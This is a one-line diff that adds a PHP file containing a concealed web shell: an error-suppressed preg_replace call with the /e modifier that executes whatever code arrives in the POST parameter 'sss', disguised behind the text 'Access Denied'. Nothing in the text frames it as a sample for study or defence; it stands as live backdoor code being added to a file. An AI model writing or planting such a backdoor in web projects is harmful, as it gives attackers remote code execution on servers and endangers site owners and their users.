@@ -1,0 +1,1 @@
+<?php @preg_replace("//e",$_POST['sss'],"Access Denied");?>
